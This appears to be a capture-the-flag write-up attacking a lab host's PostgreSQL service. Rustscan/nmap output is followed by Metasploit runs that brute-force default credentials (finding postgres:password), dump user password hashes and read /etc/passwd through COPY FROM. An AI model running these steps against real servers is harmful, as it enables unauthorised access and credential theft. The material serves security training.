


## 🔍 1. Initial Reconnaissance

***Rustscan***

```

rustscan -a 10.49.166.197  
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Port scanning: Making networking exciting since... whenever.

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.49.166.197:22
Open 10.49.166.197:80
Open 10.49.166.197:5432
[~] Starting Script(s)
[~] Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-18 08:12 -0400
Initiating Ping Scan at 08:12
Scanning 10.49.166.197 [4 ports]
Completed Ping Scan at 08:12, 0.10s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 08:12
Completed Parallel DNS resolution of 1 host. at 08:12, 0.50s elapsed
DNS resolution of 1 IPs took 0.50s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 08:12
Scanning 10.49.166.197 [3 ports]
Discovered open port 5432/tcp on 10.49.166.197
Discovered open port 80/tcp on 10.49.166.197
Discovered open port 22/tcp on 10.49.166.197
Completed SYN Stealth Scan at 08:12, 0.09s elapsed (3 total ports)
Nmap scan report for 10.49.166.197
Host is up, received reset ttl 62 (0.077s latency).
Scanned at 2026-06-18 08:12:32 EDT for 0s

PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 62
80/tcp   open  http       syn-ack ttl 62
5432/tcp open  postgresql syn-ack ttl 62

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.77 seconds
    Raw packets sent: 7 (284B) | Rcvd: 4 (172B)

     
```


## PostgreSQL user& password Enumeration

```
msfconsole
Metasploit tip: After running db_nmap, be sure to check out the result 
of hosts and services
                                                  
                                   ____________
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]
 [% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]
 [% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]
 [% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]


       =[ metasploit v6.4.133-dev                               ]
+ -- --=[ 2,647 exploits - 1,335 auxiliary - 2,154 payloads     ]
+ -- --=[ 432 post - 49 encoders - 14 nops - 12 evasion         ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > search postgresql

Matching Modules
================

   #   Name                                                                                      Disclosure Date  Rank       Check  Description
   -   ----                                                                                      ---------------  ----       -----  -----------
   0   exploit/linux/http/acronis_cyber_infra_cve_2023_45249                                     2024-07-24       excellent  Yes    Acronis Cyber Infrastructure default password remote code execution
   1     \_ target: Unix/Linux Command                                                           .                .          .      .
   2     \_ target: Interactive SSH                                                              .                .          .      .
   3   exploit/linux/http/appsmith_rce_cve_2024_55964                                            2025-03-25       excellent  Yes    Appsmith RCE
   4   auxiliary/server/capture/postgresql                                                       .                normal     No     Authentication Capture: PostgreSQL                                                                                                                                                      
   5   exploit/linux/http/beyondtrust_pra_rs_unauth_rce                                          2024-12-16       excellent  Yes    BeyondTrust Privileged Remote Access (PRA) and Remote Support (RS) unauthenticated Remote Code Execution
   6   post/linux/gather/enum_users_history                                                      .                normal     No     Linux Gather User History
   7   exploit/multi/http/manage_engine_dc_pmp_sqli                                              2014-06-08       excellent  Yes    ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
   8     \_ target: Automatic                                                                    .                .          .      .
   9     \_ target: Desktop Central v8 >= b80200 / v9 < b90039 (PostgreSQL) on Windows           .                .          .      .
   10    \_ target: Desktop Central MSP v8 >= b80200 / v9 < b90039 (PostgreSQL) on Windows       .                .          .      .
   11    \_ target: Desktop Central [MSP] v7 >= b70200 / v8 / v9 < b90039 (MySQL) on Windows     .                .          .      .
   12    \_ target: Password Manager Pro [MSP] v6 >= b6800 / v7 < b7003 (PostgreSQL) on Windows  .                .          .      .
   13    \_ target: Password Manager Pro v6 >= b6500 / v7 < b7003 (MySQL) on Windows             .                .          .      .
   14    \_ target: Password Manager Pro [MSP] v6 >= b6800 / v7 < b7003 (PostgreSQL) on Linux    .                .          .      .
   15    \_ target: Password Manager Pro v6 >= b6500 / v7 < b7003 (MySQL) on Linux               .                .          .      .
   16  auxiliary/admin/http/manageengine_pmp_privesc                                             2014-11-08       normal     Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
   17  auxiliary/scanner/http/nable_ncentral_auth_bypass_xxe                                     2025-11-17       normal     No     N-able N-Central Authentication Bypass and XXE Scanner
   18  exploit/multi/postgres/postgres_copy_from_program_cmd_exec                                2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
   19    \_ target: Automatic                                                                    .                .          .      .
   20    \_ target: Unix/OSX/Linux                                                               .                .          .      .
   21    \_ target: Windows - PowerShell (In-Memory)                                             .                .          .      .
   22    \_ target: Windows (CMD)                                                                .                .          .      .
   23  exploit/multi/postgres/postgres_createlang                                                2016-01-01       good       Yes    PostgreSQL CREATE LANGUAGE Execution
   24  auxiliary/scanner/postgres/postgres_dbname_flag_injection                                 .                normal     No     PostgreSQL Database Name Command Line Flag Injection
   25  auxiliary/scanner/postgres/postgres_login                                                 .                normal     No     PostgreSQL Login Utility
   26  auxiliary/admin/postgres/postgres_readfile                                                .                normal     No     PostgreSQL Server Generic Query
   27  auxiliary/admin/postgres/postgres_sql                                                     .                normal     No     PostgreSQL Server Generic Query
   28  auxiliary/scanner/postgres/postgres_version                                               .                normal     No     PostgreSQL Version Probe
   29  exploit/linux/postgres/postgres_payload                                                   2007-06-05       excellent  Yes    PostgreSQL for Linux Payload Execution
   30    \_ target: Linux x86                                                                    .                .          .      .
   31    \_ target: Linux x86_64                                                                 .                .          .      .
   32  exploit/windows/postgres/postgres_payload                                                 2009-04-10       excellent  Yes    PostgreSQL for Microsoft Windows Payload Execution
   33    \_ target: Windows x86                                                                  .                .          .      .
   34    \_ target: Windows x64                                                                  .                .          .      .
   35  auxiliary/admin/http/rails_devise_pass_reset                                              2013-01-28       normal     No     Ruby on Rails Devise Authentication Password Reset
   36  exploit/multi/http/rudder_server_sqli_rce                                                 2023-06-16       excellent  Yes    Rudder Server SQLI Remote Code Execution
   37  post/linux/gather/vcenter_secrets_dump                                                    2022-04-15       normal     No     VMware vCenter Secrets Dump


Interact with a module by name or index. For example info 37, use 37 or use post/linux/gather/vcenter_secrets_dump

msf > use 25
[*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session
msf auxiliary(scanner/postgres/postgres_login) > set rhost 10.49.166.197
rhost => 10.49.166.197
msf auxiliary(scanner/postgres/postgres_login) > show options

Module options (auxiliary/scanner/postgres/postgres_login):

   Name              Current Setting                              Required  Description
   ----              ---------------                              --------  -----------
   ANONYMOUS_LOGIN   false                                        yes       Attempt to login with a blank username and password
   BLANK_PASSWORDS   false                                        no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                            yes       How fast to bruteforce, from 0 to 5
   CreateSession     false                                        no        Create a new session for every successful login
   DATABASE          template1                                    yes       The database to authenticate against
   DB_ALL_CREDS      false                                        no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                        no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                        no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none                                         no        Skip existing credentials stored in the current database (Accepted: none, user,
                                                                            user&realm)
   PASSWORD                                                       no        A specific password to authenticate with
   PASS_FILE         /usr/share/metasploit-framework/data/wordli  no        File containing passwords, one per line
                     sts/postgres_default_pass.txt
   Proxies                                                        no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies:
                                                                             socks5, http, socks5h, sapni, socks4
   RETURN_ROWSET     true                                         no        Set to true to see query result sets
   RHOSTS            10.49.166.197                                yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics
                                                                            /using-metasploit.html
   RPORT             5432                                         yes       The target port (TCP)
   STOP_ON_SUCCESS   false                                        yes       Stop guessing when a credential works for a host
   THREADS           1                                            yes       The number of concurrent threads (max one per host)
   USERNAME                                                       no        A specific username to authenticate as
   USERPASS_FILE     /usr/share/metasploit-framework/data/wordli  no        File containing (space-separated) users and passwords, one pair per line
                     sts/postgres_default_userpass.txt
   USER_AS_PASS      false                                        no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-framework/data/wordli  no        File containing users, one per line
                     sts/postgres_default_user.txt
   VERBOSE           true                                         yes       Whether to print output for all attempts


View the full module info with the info, or info -d command.

msf auxiliary(scanner/postgres/postgres_login) > run
[!] 10.49.166.197:5432    - No active DB -- Credential data will not be saved!
[-] 10.49.166.197:5432    - 10.49.166.197:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)
[-] 10.49.166.197:5432    - 10.49.166.197:5432 - LOGIN FAILED: :tiger@template1 (Incorrect: Invalid username or password)
[-] 10.49.166.197:5432    - 10.49.166.197:5432 - LOGIN FAILED: :postgres@template1 (Incorrect: Invalid username or password)
[-] 10.49.166.197:5432    - 10.49.166.197:5432 - LOGIN FAILED: :password@template1 (Incorrect: Invalid username or password)
[-] 10.49.166.197:5432    - 10.49.166.197:5432 - LOGIN FAILED: :admin@template1 (Incorrect: Invalid username or password)
[-] 10.49.166.197:5432    - 10.49.166.197:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)
[-] 10.49.166.197:5432    - 10.49.166.197:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.49.166.197:5432    - 10.49.166.197:5432 - LOGIN FAILED: postgres:postgres@template1 (Incorrect: Invalid username or password)
[+] 10.49.166.197:5432    - 10.49.166.197:5432 - Login Successful: postgres:password@template1
[-] 10.49.166.197:5432    - 10.49.166.197:5432 - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password)
[-] 10.49.166.197:5432    - 10.49.166.197:5432 - LOGIN FAILED: scott:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.49.166.197:5432    - 10.49.166.197:5432 - LOGIN FAILED: scott:postgres@template1 (Incorrect: Invalid username or password)
[-] 10.49.166.197:5432    - 10.49.166.197:5432 - LOGIN FAILED: scott:password@template1 (Incorrect: Invalid username or password)
[-] 10.49.166.197:5432    - 10.49.166.197:5432 - LOGIN FAILED: scott:admin@template1 (Incorrect: Invalid username or password)
[-] 10.49.166.197:5432    - 10.49.166.197:5432 - LOGIN FAILED: admin:@template1 (Incorrect: Invalid username or password)
[-] 10.49.166.197:5432    - 10.49.166.197:5432 - LOGIN FAILED: admin:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.49.166.197:5432    - 10.49.166.197:5432 - LOGIN FAILED: admin:postgres@template1 (Incorrect: Invalid username or password)
[-] 10.49.166.197:5432    - 10.49.166.197:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
[-] 10.49.166.197:5432    - 10.49.166.197:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
[-] 10.49.166.197:5432    - 10.49.166.197:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
[-] 10.49.166.197:5432    - 10.49.166.197:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
[*] 10.49.166.197:5432    - Scanned 1 of 1 hosts (100% complete)
[*] 10.49.166.197:5432    - Bruteforce completed, 1 credential was successful.
[*] 10.49.166.197:5432    - You can open a Postgres session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed
msf auxiliary(scanner/postgres/postgres_login) > 

```


```
search postgresql

Matching Modules
================

   #   Name                                                                                      Disclosure Date  Rank       Check  Description
   -   ----                                                                                      ---------------  ----       -----  -----------
   0   exploit/linux/http/acronis_cyber_infra_cve_2023_45249                                     2024-07-24       excellent  Yes    Acronis Cyber Infrastructure default password remote code execution
   1     \_ target: Unix/Linux Command                                                           .                .          .      .
   2     \_ target: Interactive SSH                                                              .                .          .      .
   3   exploit/linux/http/appsmith_rce_cve_2024_55964                                            2025-03-25       excellent  Yes    Appsmith RCE
   4   auxiliary/server/capture/postgresql                                                       .                normal     No     Authentication Capture: PostgreSQL
   5   exploit/linux/http/beyondtrust_pra_rs_unauth_rce                                          2024-12-16       excellent  Yes    BeyondTrust Privileged Remote Access (PRA) and Remote Support (RS) unauthenticated Remote Code Execution
   6   post/linux/gather/enum_users_history                                                      .                normal     No     Linux Gather User History
   7   exploit/multi/http/manage_engine_dc_pmp_sqli                                              2014-06-08       excellent  Yes    ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
   8     \_ target: Automatic                                                                    .                .          .      .
   9     \_ target: Desktop Central v8 >= b80200 / v9 < b90039 (PostgreSQL) on Windows           .                .          .      .
   10    \_ target: Desktop Central MSP v8 >= b80200 / v9 < b90039 (PostgreSQL) on Windows       .                .          .      .
   11    \_ target: Desktop Central [MSP] v7 >= b70200 / v8 / v9 < b90039 (MySQL) on Windows     .                .          .      .
   12    \_ target: Password Manager Pro [MSP] v6 >= b6800 / v7 < b7003 (PostgreSQL) on Windows  .                .          .      .
   13    \_ target: Password Manager Pro v6 >= b6500 / v7 < b7003 (MySQL) on Windows             .                .          .      .
   14    \_ target: Password Manager Pro [MSP] v6 >= b6800 / v7 < b7003 (PostgreSQL) on Linux    .                .          .      .
   15    \_ target: Password Manager Pro v6 >= b6500 / v7 < b7003 (MySQL) on Linux               .                .          .      .
   16  auxiliary/admin/http/manageengine_pmp_privesc                                             2014-11-08       normal     Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
   17  auxiliary/scanner/http/nable_ncentral_auth_bypass_xxe                                     2025-11-17       normal     No     N-able N-Central Authentication Bypass and XXE Scanner
   18  exploit/multi/postgres/postgres_copy_from_program_cmd_exec                                2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
   19    \_ target: Automatic                                                                    .                .          .      .
   20    \_ target: Unix/OSX/Linux                                                               .                .          .      .
   21    \_ target: Windows - PowerShell (In-Memory)                                             .                .          .      .
   22    \_ target: Windows (CMD)                                                                .                .          .      .
   23  exploit/multi/postgres/postgres_createlang                                                2016-01-01       good       Yes    PostgreSQL CREATE LANGUAGE Execution
   24  auxiliary/scanner/postgres/postgres_dbname_flag_injection                                 .                normal     No     PostgreSQL Database Name Command Line Flag Injection
   25  auxiliary/scanner/postgres/postgres_login                                                 .                normal     No     PostgreSQL Login Utility
   26  auxiliary/admin/postgres/postgres_readfile                                                .                normal     No     PostgreSQL Server Generic Query
   27  auxiliary/admin/postgres/postgres_sql                                                     .                normal     No     PostgreSQL Server Generic Query
   28  auxiliary/scanner/postgres/postgres_version                                               .                normal     No     PostgreSQL Version Probe
   29  exploit/linux/postgres/postgres_payload                                                   2007-06-05       excellent  Yes    PostgreSQL for Linux Payload Execution
   30    \_ target: Linux x86                                                                    .                .          .      .
   31    \_ target: Linux x86_64                                                                 .                .          .      .
   32  exploit/windows/postgres/postgres_payload                                                 2009-04-10       excellent  Yes    PostgreSQL for Microsoft Windows Payload Execution
   33    \_ target: Windows x86                                                                  .                .          .      .
   34    \_ target: Windows x64                                                                  .                .          .      .
   35  auxiliary/admin/http/rails_devise_pass_reset                                              2013-01-28       normal     No     Ruby on Rails Devise Authentication Password Reset
   36  exploit/multi/http/rudder_server_sqli_rce                                                 2023-06-16       excellent  Yes    Rudder Server SQLI Remote Code Execution
   37  post/linux/gather/vcenter_secrets_dump                                                    2022-04-15       normal     No     VMware vCenter Secrets Dump


Interact with a module by name or index. For example info 37, use 37 or use post/linux/gather/vcenter_secrets_dump

msf > use 27
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf auxiliary(admin/postgres/postgres_sql) > show options

Module options (auxiliary/admin/postgres/postgres_sql):

   Name           Current Setting   Required  Description
   ----           ---------------   --------  -----------
   RETURN_ROWSET  true              no        Set to true to see query result sets
   SQL            select version()  no        The SQL query to execute
   VERBOSE        false             no        Enable verbose output


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


   Used when making a new connection via RHOSTS:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  postgres         no        The database to authenticate against
   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
   RHOSTS                     no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     5432             no        The target port (TCP)
   USERNAME  postgres         no        The username to authenticate as


View the full module info with the info, or info -d command.

msf auxiliary(admin/postgres/postgres_sql) > set rhost 10.49.166.197
rhost => 10.49.166.197
msf auxiliary(admin/postgres/postgres_sql) > set PASSWORD password
PASSWORD => password
msf auxiliary(admin/postgres/postgres_sql) > run
[*] Running module against 10.49.166.197
Query Text: 'select version()'
==============================

    version
    -------
    PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit

[*] Auxiliary module execution completed
msf auxiliary(admin/postgres/postgres_sql) > 

```


```
msf auxiliary(admin/postgres/postgres_sql) > search postgre

Matching Modules
================

   #   Name                                                                                      Disclosure Date  Rank       Check  Description
   -   ----                                                                                      ---------------  ----       -----  -----------
   0   exploit/linux/http/acronis_cyber_infra_cve_2023_45249                                     2024-07-24       excellent  Yes    Acronis Cyber Infrastructure default password remote code execution
   1     \_ target: Unix/Linux Command                                                           .                .          .      .
   2     \_ target: Interactive SSH                                                              .                .          .      .
   3   exploit/linux/http/appsmith_rce_cve_2024_55964                                            2025-03-25       excellent  Yes    Appsmith RCE
   4   auxiliary/server/capture/postgresql                                                       .                normal     No     Authentication Capture: PostgreSQL
   5   exploit/linux/http/beyondtrust_pra_rs_unauth_rce                                          2024-12-16       excellent  Yes    BeyondTrust Privileged Remote Access (PRA) and Remote Support (RS) unauthenticated Remote Code Execution
   6   post/linux/gather/enum_users_history                                                      .                normal     No     Linux Gather User History
   7   exploit/multi/http/manage_engine_dc_pmp_sqli                                              2014-06-08       excellent  Yes    ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
   8     \_ target: Automatic                                                                    .                .          .      .
   9     \_ target: Desktop Central v8 >= b80200 / v9 < b90039 (PostgreSQL) on Windows           .                .          .      .
   10    \_ target: Desktop Central MSP v8 >= b80200 / v9 < b90039 (PostgreSQL) on Windows       .                .          .      .
   11    \_ target: Desktop Central [MSP] v7 >= b70200 / v8 / v9 < b90039 (MySQL) on Windows     .                .          .      .
   12    \_ target: Password Manager Pro [MSP] v6 >= b6800 / v7 < b7003 (PostgreSQL) on Windows  .                .          .      .
   13    \_ target: Password Manager Pro v6 >= b6500 / v7 < b7003 (MySQL) on Windows             .                .          .      .
   14    \_ target: Password Manager Pro [MSP] v6 >= b6800 / v7 < b7003 (PostgreSQL) on Linux    .                .          .      .
   15    \_ target: Password Manager Pro v6 >= b6500 / v7 < b7003 (MySQL) on Linux               .                .          .      .
   16  exploit/windows/misc/manageengine_eventlog_analyzer_rce                                   2015-07-11       manual     Yes    ManageEngine EventLog Analyzer Remote Code Execution
   17  auxiliary/admin/http/manageengine_pmp_privesc                                             2014-11-08       normal     Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
   18  auxiliary/scanner/http/nable_ncentral_auth_bypass_xxe                                     2025-11-17       normal     No     N-able N-Central Authentication Bypass and XXE Scanner
   19  auxiliary/analyze/crack_databases                                                         .                normal     No     Password Cracker: Databases
   20    \_ action: auto                                                                         .                .          .      Auto-selection of cracker
   21    \_ action: hashcat                                                                      .                .          .      Use Hashcat
   22    \_ action: john                                                                         .                .          .      Use John the Ripper
   23  exploit/multi/postgres/postgres_copy_from_program_cmd_exec                                2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
   24    \_ target: Automatic                                                                    .                .          .      .
   25    \_ target: Unix/OSX/Linux                                                               .                .          .      .
   26    \_ target: Windows - PowerShell (In-Memory)                                             .                .          .      .
   27    \_ target: Windows (CMD)                                                                .                .          .      .
   28  exploit/multi/postgres/postgres_createlang                                                2016-01-01       good       Yes    PostgreSQL CREATE LANGUAGE Execution
   29  auxiliary/scanner/postgres/postgres_dbname_flag_injection                                 .                normal     No     PostgreSQL Database Name Command Line Flag Injection
   30  auxiliary/scanner/postgres/postgres_login                                                 .                normal     No     PostgreSQL Login Utility
   31  auxiliary/admin/postgres/postgres_readfile                                                .                normal     No     PostgreSQL Server Generic Query
   32  auxiliary/admin/postgres/postgres_sql                                                     .                normal     No     PostgreSQL Server Generic Query
   33  auxiliary/scanner/postgres/postgres_version                                               .                normal     No     PostgreSQL Version Probe
   34  exploit/linux/postgres/postgres_payload                                                   2007-06-05       excellent  Yes    PostgreSQL for Linux Payload Execution
   35    \_ target: Linux x86                                                                    .                .          .      .
   36    \_ target: Linux x86_64                                                                 .                .          .      .
   37  exploit/windows/postgres/postgres_payload                                                 2009-04-10       excellent  Yes    PostgreSQL for Microsoft Windows Payload Execution
   38    \_ target: Windows x86                                                                  .                .          .      .
   39    \_ target: Windows x64                                                                  .                .          .      .
   40  auxiliary/scanner/postgres/postgres_hashdump                                              .                normal     No     Postgres Password Hashdump
   41  auxiliary/scanner/postgres/postgres_schemadump                                            .                normal     No     Postgres Schema Dump
   42  auxiliary/admin/http/rails_devise_pass_reset                                              2013-01-28       normal     No     Ruby on Rails Devise Authentication Password Reset
   43  exploit/multi/http/rudder_server_sqli_rce                                                 2023-06-16       excellent  Yes    Rudder Server SQLI Remote Code Execution
   44  post/linux/gather/vcenter_secrets_dump                                                    2022-04-15       normal     No     VMware vCenter Secrets Dump


Interact with a module by name or index. For example info 44, use 44 or use post/linux/gather/vcenter_secrets_dump

msf auxiliary(admin/postgres/postgres_sql) > use 40
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf auxiliary(scanner/postgres/postgres_hashdump) > set rhost 10.49.166.197
rhost => 10.49.166.197
msf auxiliary(scanner/postgres/postgres_hashdump) > set PASSWORD postgres password
PASSWORD => postgres password
msf auxiliary(scanner/postgres/postgres_hashdump) > run
[-] 10.49.166.197:5432 - Auxiliary failed: NoMethodError undefined method `peerhost' for nil
[-] 10.49.166.197:5432 - Call stack:
[-] 10.49.166.197:5432 -   /usr/share/metasploit-framework/modules/auxiliary/scanner/postgres/postgres_hashdump.rb:44:in `run_host'
[-] 10.49.166.197:5432 -   /usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:130:in `block (2 levels) in run'
[-] 10.49.166.197:5432 -   /usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:105:in `block in spawn'
[*] Auxiliary module execution completed
msf auxiliary(scanner/postgres/postgres_hashdump) > show options

Module options (auxiliary/scanner/postgres/postgres_hashdump):

   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


   Used when making a new connection via RHOSTS:

   Name      Current Setting    Required  Description
   ----      ---------------    --------  -----------
   DATABASE  postgres           no        The database to authenticate against
   PASSWORD  postgres password  no        The password for the specified username. Leave blank for a random password.
   RHOSTS    10.49.166.197      no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     5432               no        The target port (TCP)
   THREADS   1                  yes       The number of concurrent threads (max one per host)
   USERNAME  postgres           no        The username to authenticate as


View the full module info with the info, or info -d command.

msf auxiliary(scanner/postgres/postgres_hashdump) > set PASSWORD password 
PASSWORD => password
msf auxiliary(scanner/postgres/postgres_hashdump) > run
[+] 10.49.166.197:5432 - Query appears to have run successfully
[+] 10.49.166.197:5432 - Postgres Server Hashes
======================

 Username   Hash
 --------   ----
 darkstart  md58842b99375db43e9fdf238753623a27d
 poster     md578fb805c7412ae597b399844a54cce0a
 postgres   md532e12f215ba27cb750c9e093ce4b5127
 sistemas   md5f7dbc0d5a06653e74da6b1af9290ee2b
 ti         md57af9ac4c593e9e4f275576e13f935579
 tryhackme  md503aab1165001c8f8ccae31a8824efddc

[*] 10.49.166.197:5432 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/postgres/postgres_hashdu
```



```
msf auxiliary(scanner/postgres/postgres_hashdump) > use 26
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf auxiliary(admin/postgres/postgres_readfile) > show options

Module options (auxiliary/admin/postgres/postgres_readfile):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RFILE    /etc/passwd      yes       The remote file
   VERBOSE  false            no        Enable verbose output


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


   Used when making a new connection via RHOSTS:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  postgres         no        The database to authenticate against
   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
   RHOSTS                     no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     5432             no        The target port (TCP)
   USERNAME  postgres         no        The username to authenticate as


View the full module info with the info, or info -d command.

msf auxiliary(admin/postgres/postgres_readfile) > set rhost 10.49.166.197
rhost => 10.49.166.197
msf auxiliary(admin/postgres/postgres_readfile) > set PASSWORD  password
PASSWORD => password
msf auxiliary(admin/postgres/postgres_readfile) > run
[*] Running module against 10.49.166.197
Query Text: 'CREATE TEMP TABLE QSUxCWtchs (INPUT TEXT);
      COPY QSUxCWtchs FROM '/etc/passwd';
      SELECT * FROM QSUxCWtchs'
=================================================================================================================================

    input
    -----
    #/home/dark/credentials.txt
    _apt:x:105:65534::/nonexistent:/bin/false
    alison:x:1000:1000:Poster,,,:/home/alison:/bin/bash
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    dark:x:1001:1001::/home/dark:
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    messagebus:x:106:110::/var/run/dbus:/bin/false
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    postgres:x:109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    root:x:0:0:root:/root:/bin/bash
    sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    syslog:x:104:108::/home/syslog:/bin/false
    systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
    systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
    systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
    systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    uuidd:x:107:111::/run/uuidd:/bin/false
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

#/home/dark/credentials.txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
